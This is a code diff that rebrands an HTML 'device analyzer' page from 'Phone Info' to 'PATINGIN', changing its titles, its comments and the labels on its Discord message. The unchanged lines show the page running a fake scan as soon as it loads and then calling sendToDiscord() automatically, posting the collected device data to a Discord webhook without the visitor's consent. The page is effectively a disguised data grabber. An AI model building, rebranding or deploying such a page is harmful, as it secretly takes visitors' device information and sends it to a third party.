@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Phone Info</title>
+  <title>PATINGIN</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -121,7 +121,7 @@
 <div class="container">
 
   <div id="scanScreen">
-    <div class="title-text">PHONE INFO</div>
+    <div class="title-text">PATINGIN</div>
     <div class="subtitle">DEVICE ANALYZER</div>
     <div class="radar"></div>
     <div id="statusTitle">⟩ SCANNING DEVICE</div>
@@ -135,7 +135,7 @@
   <div id="doneScreen">
     <div class="done-header">
       <div class="done-icon">✅</div>
-      <div class="done-title">PHONE INFO</div>
+      <div class="done-title">PATINGIN</div>
       <div class="done-sub">SCAN COMPLETE</div>
     </div>
     <div class="legend">
@@ -187,7 +187,6 @@
   }
   function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-  // Modified to trigger send automatically
   async function runScan() {
     for (let i = 0; i < steps.length; i++) {
       statusLine.textContent = steps[i];
@@ -197,10 +196,10 @@
     }
     await sleep(400);
     
-    // Build the results UI first
+    // Populate data
     await showResults();
     
-    // Automatically trigger the Discord send
+    // Automatic Send
     sendToDiscord();
   }
 
@@ -429,9 +428,9 @@
 
     const lines = Object.entries(_data).map(([k, v]) => `**${k}:** ${v}`).join('\n');
     const payload = {
-      username: "Phone Info",
+      username: "PATINGIN Report",
       embeds: [{
-        title: "📱 Phone Info Report",
+        title: "📱 PATINGIN Device Report",
         description: lines,
         color: 0x00ff88,
         footer: { text: new Date().toLocaleString() }
@@ -461,5 +460,4 @@
   runScan();
 </script>
 </body>
-  </html>
-
+</html>
